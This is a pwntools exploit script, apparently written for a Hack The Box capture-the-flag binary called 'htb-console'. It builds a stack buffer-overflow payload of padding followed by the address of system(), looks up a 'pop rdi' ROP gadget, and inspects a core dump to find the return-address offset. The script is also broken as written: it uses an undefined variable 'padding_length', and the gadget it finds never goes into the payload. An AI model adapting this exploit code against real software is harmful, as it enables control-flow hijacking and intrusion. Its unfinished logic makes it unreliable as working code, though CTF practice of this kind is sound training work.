
from pwn import *

#context.log_level = 'DEBUG'
context(os='linux', arch='amd64')

executable = '/home/kali/Downloads/htb-console'

padding_length_flag = 24
system_call = p64(0x401381)


elf = context.binary = ELF(executable)

log.info('Get Addresses')
#info("%#x run", elf.symbols.run)
#info("%#x winner", elf.symbols.winner)

info("%#x system", elf.symbols.system)
system_address = p64(elf.symbols.system)

rop = ROP(elf)
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
info("%#x POP RDI", POP_RDI)

log.info('Create IO')
#io = remote('', )
io = process(executable)

log.info('Send Command flag')
io.sendlineafter('>>', 'flag')

#payload = cyclic(200)


padding = b'A' * padding_length
payload = padding + system_address


log.info('Send Payload')
io.sendlineafter('flag: ', payload)     #flag

io.wait()

core = io.corefile
stack = core.rsp
info("rsp = %#x", stack)
pattern = core.read(stack, 4)
info("cyclic pattern = %s", pattern.decode())
rip_offset = cyclic_find(pattern)
info("rip offset is = %d", rip_offset)

io.interactive()

